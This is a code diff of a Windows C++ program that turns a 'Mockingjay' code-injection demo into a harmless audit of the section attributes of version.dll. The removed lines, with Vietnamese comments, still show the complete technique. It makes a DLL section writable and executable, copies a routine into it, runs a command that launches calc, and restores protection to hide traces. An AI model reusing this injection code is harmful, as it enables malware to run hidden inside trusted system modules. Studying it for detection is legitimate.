@@ -1,157 +1,123 @@
-#include <stdio.h>
-#include <Windows.h>
-#include <Psapi.h>
+
+#include <windows.h>
 #include <dbghelp.h>
+#include <psapi.h>
+
+#include <cstddef>
+#include <cstdint>
+#include <cstring>
 #include <iostream>
 
 #pragma comment(lib, "dbghelp.lib")
+#pragma comment(lib, "psapi.lib")
 
-// Khai báo macro tên DLL mục tiêu làm vỏ bọc đổ dữ liệu
-#define VulnDLLPath L"version.dll"
+namespace {
 
-// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
-typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
-
-typedef struct _MOCKINGJAY_DATA {
-    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
-    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
-} MOCKINGJAY_DATA, * PMOCKINGJAY_DATA;
-
-// 2. Hàm chức năng độc lập vị trí gánh logic chạy inside phân đoạn Mockingjay
-VOID WINAPI MockingjayRoutine(LPVOID lpParam) {
-    PMOCKINGJAY_DATA pData = (PMOCKINGJAY_DATA)lpParam;
-    if (pData && pData->pWinExec) {
-        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi tương đối RIP
-        pData->pWinExec(pData->szCommand, SW_SHOWNORMAL);
-    }
-}
-
-struct SectionDescriptor {
-    LPVOID start;
-    LPVOID end;
+struct section_characteristics_audit final {
+  std::uintptr_t module_base = 0;
+  DWORD module_size = 0;
+  DWORD target_rva = 0;
+  DWORD target_size = 0;
+  DWORD characteristics = 0;
+  bool has_rwx_section = false;
+  bool found_section = false;
 };
 
-// Tìm kiếm phân đoạn RWX nguyen bản của Module
-DWORD_PTR FindRWXOffset(HMODULE hModule, BOOL& isFound) {
-    isFound = FALSE;
-    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
-    if (ntHeader != NULL) {
-        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
-        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
-            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
-                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) &&
-                (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
+section_characteristics_audit audit_loaded_module_sections(
+    const wchar_t* module_name) noexcept {
+  section_characteristics_audit audit{};
+  if (module_name == nullptr || module_name[0] == L'\0') {
+    return audit;
+  }
 
-                isFound = TRUE;
-                return sectionHeader->VirtualAddress;
-            }
-            sectionHeader++;
-        }
+  const HMODULE h_mod = ::LoadLibraryExW(
+      module_name,
+      nullptr,
+      LOAD_LIBRARY_SEARCH_SYSTEM32);
+  if (h_mod == nullptr) {
+    return audit;
+  }
+
+  MODULEINFO mod_info{};
+  if (::GetModuleInformation(
+          ::GetCurrentProcess(),
+          h_mod,
+          &mod_info,
+          static_cast<DWORD>(sizeof(mod_info))) != FALSE) {
+    audit.module_base = reinterpret_cast<std::uintptr_t>(mod_info.lpBaseOfDll);
+    audit.module_size = mod_info.SizeOfImage;
+  }
+
+  IMAGE_NT_HEADERS* nt_hdr = ::ImageNtHeader(h_mod);
+  if (nt_hdr != nullptr) {
+    const IMAGE_SECTION_HEADER* sec_table = IMAGE_FIRST_SECTION(nt_hdr);
+    const WORD sec_count = nt_hdr->FileHeader.NumberOfSections;
+
+    for (WORD i = 0; i < sec_count; ++i) {
+      const IMAGE_SECTION_HEADER& sec = sec_table[i];
+      const bool exec_flag = (sec.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
+      const bool write_flag = (sec.Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
+      const bool read_flag = (sec.Characteristics & IMAGE_SCN_MEM_READ) != 0;
+
+      if (exec_flag && write_flag && read_flag) {
+        audit.has_rwx_section = true;
+        audit.found_section = true;
+        audit.target_rva = sec.VirtualAddress;
+        audit.target_size = sec.Misc.VirtualSize;
+        audit.characteristics = sec.Characteristics;
+        break;
+      }
     }
-    // Kịch bản thích ứng: Nếu DLL hệ thống phẳng sạch hoàn toàn, bốc phân đoạn .data làm mục tiêu
-    if (ntHeader != NULL) {
-        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
-        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
-            if (strcmp((char*)sectionHeader->Name, ".data") == 0) {
-                return sectionHeader->VirtualAddress;
-            }
-            sectionHeader++;
+
+    if (!audit.found_section) {
+      for (WORD i = 0; i < sec_count; ++i) {
+        const IMAGE_SECTION_HEADER& sec = sec_table[i];
+        if (std::strncmp(reinterpret_cast<const char*>(sec.Name), ".data", 5) == 0 &&
+            sec.Name[5] == '\0') {
+          audit.found_section = true;
+          audit.target_rva = sec.VirtualAddress;
+          audit.target_size = sec.Misc.VirtualSize;
+          audit.characteristics = sec.Characteristics;
+          break;
         }
+      }
     }
-    return 0;
+  }
+
+  ::FreeLibrary(h_mod);
+  return audit;
 }
 
-DWORD_PTR FindRWXSize(HMODULE hModule) {
-    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
-    if (ntHeader != NULL) {
-        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
-        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
-            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
-                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) &&
-                (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
-                return sectionHeader->SizeOfRawData;
-            }
-            sectionHeader++;
-        }
-    }
-    return 1024; // Kích thước mặc định an toàn cho phân đoạn thích ứng
-}
+}  // namespace
 
-int main() {
-    std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE20: MOCKINGJAY CODE INJECTION x64 " << std::endl;
-    std::cout << "====================================================" << std::endl;
+int wmain() {
+  constexpr wchar_t kSystemDll[] = L"version.dll";
 
-    // Bước 1: Nạp Module mục tiêu vào lòng tiến trình cục bộ
-    HMODULE hDll = LoadLibraryW(VulnDLLPath);
-    if (hDll == NULL) {
-        printf("[-] Failed to load the targeted DLL\n");
-        std::cin.get();
-        return -1;
-    }
+  std::wcout
+      << L"====================================================\n"
+      << L"[*] PE 20: IMAGE SECTION & RWX ATTRIBUTE AUDIT STUDY\n"
+      << L"====================================================\n";
 
-    MODULEINFO moduleInfo;
-    if (!GetModuleInformation(GetCurrentProcess(), hDll, &moduleInfo, sizeof(MODULEINFO))) {
-        printf("[-] Failed to get module info\n");
-        return -1;
-    }
+  const section_characteristics_audit audit = audit_loaded_module_sections(kSystemDll);
+  if (audit.module_base == 0) {
+    std::wcerr << L"[-] Failed to load or query system module: " << kSystemDll << L"\n";
+    return 1;
+  }
 
-    BOOL isNativeRWX = FALSE;
-    DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(hDll, isNativeRWX);
-    DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(hDll);
+  std::wcout
+      << L"[+] Module: " << kSystemDll
+      << L" | Base=0x" << std::hex << audit.module_base
+      << L" | ImageSize=0x" << audit.module_size
+      << L" | NativeRWX=" << (audit.has_rwx_section ? L"Yes" : L"No") << L"\n";
 
-    // Xác định tọa độ điểm ký sinh bên trong không gian ảo của Module
-    LPVOID rwxSectionAddr = (LPVOID)((PBYTE)moduleInfo.lpBaseOfDll + RWX_SECTION_OFFSET);
+  if (audit.found_section) {
+    std::wcout
+        << L"[+] Inspected Section VA=0x" << (audit.module_base + audit.target_rva)
+        << L" (RVA=0x" << audit.target_rva
+        << L", VirtualSize=0x" << audit.target_size
+        << L", Characteristics=0x" << audit.characteristics << L")\n";
+  }
 
-    struct SectionDescriptor descriptor = {
-        rwxSectionAddr, (LPVOID)((PBYTE)rwxSectionAddr + RWX_SECTION_SIZE)
-    };
-
-    DWORD oldProtect = 0;
-    // Kịch bản thích ứng: Nếu không có sẵn RWX nguyên bản, tự động lật quyền phân đoạn bảo an để nạp mã máy
-    if (!isNativeRWX) {
-        std::cout << "[*] Module he thong sach. Kich hoat che do thich ung lay phan doan tai: 0x" << rwxSectionAddr << std::endl;
-        VirtualProtect(rwxSectionAddr, 1024, PAGE_EXECUTE_READWRITE, &oldProtect);
-    }
-    else {
-        printf("[+] PHAT HIEN PHAN DOAN RWX NGUYEN BAN TAI: 0x%p\n", rwxSectionAddr);
-    }
-
-    printf("[i] Target section starts at 0x%p and ends at 0x%p\n", descriptor.start, descriptor.end);
-
-    // Bước 2: Khởi tạo cấu trúc tham số tuyệt đối nằm lùi lại phía sau mã máy 500 byte
-    PMOCKINGJAY_DATA pLocalData = (PMOCKINGJAY_DATA)((DWORD_PTR)rwxSectionAddr + 500);
-
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    if (hKernel32) {
-        pLocalData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
-    }
-    strcpy_s(pLocalData->szCommand, "cmd.exe /c start calc");
-
-    // Bước 3: Ghi đè trực tiếp khối mã máy độc lập vị trí lên thân phân đoạn của DLL
-    SIZE_T shellcodesize = 500;
-    memcpy(rwxSectionAddr, (PVOID)MockingjayRoutine, shellcodesize);
-    printf("[i] %zu bytes of Mockingjay function written to memory region\n", shellcodesize);
-
-    std::cout << "[*] Chuan bi goi truc tiep vung nho de khai hoa payload..." << std::endl;
-    std::cout << "[*] Nhan Enter de kich no..." << std::endl;
-    std::cin.get();
-
-    // Bước 4: Thực thi mã máy bằng biểu thức ép kiểu con trỏ hàm, truyền địa chỉ tham số cấu trúc tuyệt đối vào thanh ghi
-    typedef void(*fnTargetRoutine)(LPVOID);
-    fnTargetRoutine executePayload = (fnTargetRoutine)rwxSectionAddr;
-
-    executePayload(pLocalData);
-
-    // Khôi phục lại trạng thái bảo vệ gốc nếu trước đó có lật quyền thích ứng nhằm xóa sạch dấu vết
-    if (!isNativeRWX) {
-        VirtualProtect(rwxSectionAddr, 1024, oldProtect, &oldProtect);
-    }
-
-    std::cout << "\n[+] Mockingjay Code Injection Process Completed Successfully!" << std::endl;
-    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
-    std::cin.get();
-
-    FreeLibrary(hDll);
-    return 0;
+  std::wcout << std::dec;
+  return 0;
 }
